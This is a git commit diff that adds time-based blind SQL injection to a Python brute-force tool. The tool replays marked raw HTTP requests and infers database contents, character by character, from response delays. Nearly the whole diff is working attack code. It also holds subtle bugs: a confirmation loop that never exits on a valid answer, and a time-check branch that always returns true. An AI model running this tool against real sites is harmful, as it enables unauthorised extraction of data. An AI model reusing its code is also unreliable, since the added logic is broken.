7bc6b3dc59abb431621765e41a2898675152e1f2
h4cnull <h4cnull@foxmail.com>
2024-01-14 20:37:17 +0800

    time base support

--- BSQLisearch.py
+++ BSQLisearch.py
@@ -7,6 +7,7 @@ import argparse
 import re
 import requests
 from time import sleep
+import time
 
 #import string
 #string.printable
@@ -65,7 +66,62 @@ logger.addHandler(stdoutHandler)
 logger.addHandler(stderrHandler)
 '''
 
-def brute_force(search_ranges,proxy,true_txt,time_sec,raw_request_with_payload,tls,operator,sleep_time,increase_count):
+BASE_REQ_TIME = 1
+REQ_COUNT = 1
+
+def get_base_request_time(proxy,raw_request,host,tls):
+    base_num = 0
+    tmp = re.findall(r"{INC_(\d+)}",raw_request)
+    if len(tmp) > 0:
+        base_num = int(tmp[0])
+    base_num_str = "{INC_" + str(base_num) + "}"
+    raw_request = raw_request.replace("{STP}","")
+    raw_request = raw_request.replace(base_num_str,str(1))
+    req = str(raw_request).replace('{BFP}','impo551ble').replace('{OPE}',"=")
+    logger.debug("get base request used time by following request:")
+    print(req)
+
+    req = re.split("\r?\n\r?\n",req,maxsplit=1)
+    req_body = None
+    if len(req) == 2:
+        req_body = req[1]
+    raw_headers = req[0].split("\n")
+
+    method_res = raw_headers[0].split()
+    headers = {}
+
+    # logger.debug("{}".format(raw_headers))
+    for l in raw_headers[1:]:
+        tmp = l.split(": ",1)
+        if len(tmp) != 2:
+            continue
+        key = tmp[0].strip()
+        value = tmp[1].strip()
+        if key.lower() == "content-length":
+            if req_body != None:
+                value = str(len(req_body))
+        headers[key] = value
+    
+    method = method_res[0]
+    res = method_res[1]
+    # logger.debug("{}".format(headers))
+    if host != None:
+        url = "https://{}{}".format(host,res) if tls else "http://{}{}".format(host,res)
+    if headers.get("Host") != None:
+        url = "https://{}{}".format(headers["Host"],res) if tls else "http://{}{}".format(headers["Host"],res)
+    elif headers.get("host") != None:
+        url = "https://{}{}".format(headers["host"],res) if tls else "http://{}{}".format(headers["host"],res)
+    else:
+        logger.error("not found host")
+        return None
+    
+    r = requests.request(method=method,url=url,headers=headers,timeout=15,verify=False,data=req_body, proxies={"http":proxy,"https":proxy})
+    return r.elapsed.total_seconds()
+
+def brute_force(search_ranges,proxy,true_txt,time_sec,raw_request_with_payload,host,tls,operator,sleep_time,increase_count):
+    global BASE_REQ_TIME
+    global REQ_COUNT
+
     stacking_str = ""
     all_num = []
     base_num = 0
@@ -73,24 +129,30 @@ def brute_force(search_ranges,proxy,true_txt,time_sec,raw_request_with_payload,t
     if len(tmp) > 0:
         base_num = int(tmp[0])
     base_num_str = "{INC_" + str(base_num) + "}"
+    
     request_time = 0
     if time_sec != None and true_txt == None:
-        host = re.findall(r"\n[Hh]ost:(.*?)\n",raw_request_with_num_ope)
-        if len(host) == 0:
-            logger.error("not found host in request file")
-            return None
-        host = host[0].strip()
-        url = "https://{}/".format(host) if tls else "http://{}/".format(host)
-        r = requests.get(url,timeout=10,verify=False)
-        request_time = r.elapsed.total_seconds()
-        logger.debug("time based get request used {}s".format(request_time))
+        request_time = get_base_request_time(proxy,raw_request_with_payload,host,tls)
+        if request_time > time_sec:
+            logger.warning("request used time more than sql sleep time")
+            while True:
+                ans = input("Please confirm whether the SQL sleep statement in the payload is effective.y/n?")
+                if ans.lower() in ["y","n"]:
+                    continue
+                if ans.lower() == "y":
+                    request_time = request_time - time_sec
+                break
+        logger.info("base request time {}s".format(request_time))
+    
+    BASE_REQ_TIME = request_time
+    REQ_COUNT = 1
 
     for i in range(0,increase_count):
         inc_num = base_num + i
         raw_request_with_num_ope = raw_request_with_payload.replace("{STP}",stacking_str)
         raw_request_with_num_ope = raw_request_with_num_ope.replace(base_num_str,str(inc_num))
         for (start,end) in search_ranges:
-            ret = binary_search(start,end,proxy,true_txt,time_sec,request_time,raw_request_with_num_ope,tls,operator,sleep_time)
+            ret = binary_search(start,end,proxy,true_txt,time_sec,raw_request_with_num_ope,host,tls,operator,sleep_time)
             if ret != None:
                 if ASCII_OUTPUT:
                     stacking_str += chr(ret)
@@ -102,20 +164,24 @@ def brute_force(search_ranges,proxy,true_txt,time_sec,raw_request_with_payload,t
     else:
         logger.info("found {}".format(all_num))
 
-def binary_search(low,high,proxy,true_txt,time_sec,request_time,raw_request_with_num_ope,tls,operator,sleep_time):
+def binary_search(low,high,proxy,true_txt,time_sec,raw_request_with_num_ope,host,tls,operator,sleep_time):
     global ASCII_OUTPUT
     global ASCII
+    global BASE_REQ_TIME
+    global REQ_COUNT
 
     if ASCII and ("<" in operator or ">" in operator):
         logger.error("operators that determine the range cannot be used when brute force ascii char")
         return None
     
     logger.debug("low:{}, high:{}, proxy:{}, true txt:{}, is_tls:{}, operator:{}".format(low,high,proxy,true_txt,tls,operator))
-    host = re.findall(r"\n[Hh]ost:(.*?)\n",raw_request_with_num_ope)
-    if len(host) == 0:
-        logger.error("not found host in request file")
-        return None
-    host = host[0].strip()
+    if host == None:
+        host = re.findall(r"\n[Hh]ost:(.*?)\n",raw_request_with_num_ope)
+        if len(host) == 0:
+            logger.error("not found host in request file")
+            return None
+        host = host[0].strip()
+    
     res = raw_request_with_num_ope.split()[1]
     
     is_binary_search = True
@@ -207,7 +273,8 @@ def binary_search(low,high,proxy,true_txt,time_sec,request_time,raw_request_with
             logger.error("not found host")
             return None
         
-        r = requests.request(method=method,url=url,headers=headers,timeout=(10+time_sec) if time_sec !=None else 10,verify=False,data=req_body, proxies={"http":proxy,"https":proxy})
+        r = requests.request(method=method,url=url,headers=headers,timeout=(15+time_sec) if time_sec !=None else 15,verify=False,data=req_body, proxies={"http":proxy,"https":proxy})
+        
         # logger.debug(r.content)
         if true_txt != None:
             if true_txt in r.content.decode('utf-8'):
@@ -215,13 +282,17 @@ def binary_search(low,high,proxy,true_txt,time_sec,request_time,raw_request_with
             else:
                 pre_bool = False
         else:
-            t = r.elapsed.total_seconds() - request_time
+            t = r.elapsed.total_seconds() - (BASE_REQ_TIME/REQ_COUNT)
             if t >= time_sec:
-                logger.debug("time based server used {}s".format(t))
+                logger.debug("time based server used {}s, networking average time {}s.".format(t,BASE_REQ_TIME/REQ_COUNT))
                 pre_bool = True
+                req_time = r.elapsed.total_seconds() - time_sec
+                BASE_REQ_TIME += req_time
             else:
-                pre_bool = False
-        
+                BASE_REQ_TIME += r.elapsed.total_seconds()
+                pre_bool = True
+            REQ_COUNT += 1
+            
         if greater_than_num:
             if pre_bool:  # 大于
                 if operator == "=":
@@ -260,7 +331,7 @@ def main():
     grp = parser.add_mutually_exclusive_group(required=True)
     grp.add_argument("--true-txt",dest="true_txt",help="in response txt when true")
     grp.add_argument("--time-bind",dest="time_sec",default=0,type=int,help="time based delay secs")
-
+    parser.add_argument("--host",dest="target_host",help="specific target http host when you need different \"Host\" in raw request")
     parser.add_argument("--operator",dest="operator",choices=[">",">=","=","<=","<","like","LIKE"],default=">",help="specific the operator point {OPE} replaced symbol, default \">\"")
     parser.add_argument("-l","--log-file",dest="raw_request_file",help='raw request file with payload, brute force point marked by {BFP}, operator marked by {OPE}, stacking point marked by {STP}, increase num marked by {INC_num}',required=True)
     parser.add_argument("--tls",action="store_true",help="https connection")
@@ -299,7 +370,7 @@ def main():
             search_ranges.append((start,end))
     f = open(args.raw_request_file,'r+',encoding='utf-8')
     raw_request_with_payload = f.read()
-    brute_force(search_ranges,args.proxy,args.true_txt,args.time_sec,raw_request_with_payload,args.tls,args.operator,args.sleep_time,args.increase_count)
+    brute_force(search_ranges,args.proxy,args.true_txt,args.time_sec,raw_request_with_payload,args.target_host,args.tls,args.operator,args.sleep_time,args.increase_count)
 
 if __name__ == '__main__':
     main()
